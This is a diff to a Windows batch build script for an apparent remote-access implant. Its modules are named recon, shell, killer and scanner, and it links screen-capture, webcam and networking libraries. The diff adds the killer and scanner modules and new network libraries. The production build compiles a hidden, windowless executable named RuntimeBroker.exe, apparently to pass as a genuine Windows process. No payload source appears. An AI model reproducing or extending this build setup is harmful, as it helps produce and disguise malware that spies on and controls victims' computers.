@@ -16,7 +16,7 @@ if "%1"=="clean" goto clean
 :: Default: TEST build (with console window for debugging)
 echo [*] Building TEST mode (console visible)...
 gcc -c sqlite3.c -O2
-g++ -o test.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp sqlite3.o -lwinhttp -lgdi32 -lvfw32 -lwinmm -lcrypt32 -lbcrypt -lshlwapi -static -O2 -std=c++17
+g++ -o test.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -O2 -std=c++17
 if %errorlevel% equ 0 (
     echo [+] Build SUCCESS: test.exe
     echo [*] Run: .\test.exe
@@ -30,7 +30,7 @@ goto end
 echo [*] Building PRODUCTION mode (hidden, no console)...
 echo [!] WARNING: Make sure TEST_MODE is set to false in config.h!
 gcc -c sqlite3.c -O2
-g++ -o RuntimeBroker.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp sqlite3.o -lwinhttp -lgdi32 -lvfw32 -lwinmm -lcrypt32 -lbcrypt -lshlwapi -static -O2 -std=c++17 -mwindows
+g++ -o RuntimeBroker.exe main.cpp arsenal.cpp recon.cpp comms.cpp shell.cpp utils.cpp killer.cpp scanner.cpp sqlite3.o -lwinhttp -lws2_32 -liphlpapi -lole32 -lcrypt32 -lbcrypt -lshlwapi -lgdi32 -lvfw32 -lwinmm -static -Os -std=c++17 -mwindows
 if %errorlevel% equ 0 (
     echo [+] Build SUCCESS: RuntimeBroker.exe
     for %%A in (RuntimeBroker.exe) do echo [*] Size: %%~zA bytes
